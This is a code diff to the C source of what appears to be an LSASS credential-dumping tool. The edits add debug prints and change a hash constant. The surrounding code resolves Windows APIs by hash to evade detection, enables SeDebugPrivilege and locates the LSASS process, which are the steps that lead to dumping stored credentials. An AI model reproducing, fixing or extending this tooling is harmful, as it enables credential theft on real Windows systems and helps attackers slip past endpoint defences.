@@ -3,9 +3,10 @@
 #include "handle.h"
 #include "malseclogon.h"
 
+
 typedef BOOL(WINAPI* LookupPrivilegeValueW_t) (LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
 
-#define LookupPrivilegeValueW_SW2_HASH 0x0cc75b7b
+#define LookupPrivilegeValueW_SW2_HASH 0x8c8ec318
 
 void usage(char* procname)
 {
@@ -35,6 +36,10 @@ BOOL enable_debug_priv(void)
 	LookupPrivilegeValueW_t LookupPrivilegeValueW = NULL;
 	BOOL ok;
 
+	DWORD hash = SW2_HashSyscall("CreateProcessWithLogonW");
+	printf("hash %08x\n", hash);
+
+	
 	// find the address of LookupPrivilegeValueW dynamically
 	LookupPrivilegeValueW = (LookupPrivilegeValueW_t)get_function_address(get_library_address(ADVAPI32_DLL, TRUE), LookupPrivilegeValueW_SW2_HASH, 0);
 	if (!LookupPrivilegeValueW)
@@ -54,6 +59,8 @@ BOOL enable_debug_priv(void)
 		return FALSE;
 	}
 
+	DPRINT("NtOpenProcessToken 1\n");
+
 	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
 	if (!NT_SUCCESS(status))
 	{
@@ -61,6 +68,8 @@ BOOL enable_debug_priv(void)
 		DPRINT_ERR("Could not enable SeDebugPrivilege");
 		return FALSE;
 	}
+
+	DPRINT("NtOpenProcessToken 2\n");
 
 	tkp.PrivilegeCount = 1;
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
@@ -296,9 +305,13 @@ int main(int argc, char* argv[])
 		}
 	}
 
+	printf("enable_debug_priv 1\n");
+
 	success = enable_debug_priv();
 	if (!success)
 		return -1;
+
+	printf("enable_debug_priv 2\n");
 
 	// if not provided, get the PID of LSASS
 	if (!lsass_pid)
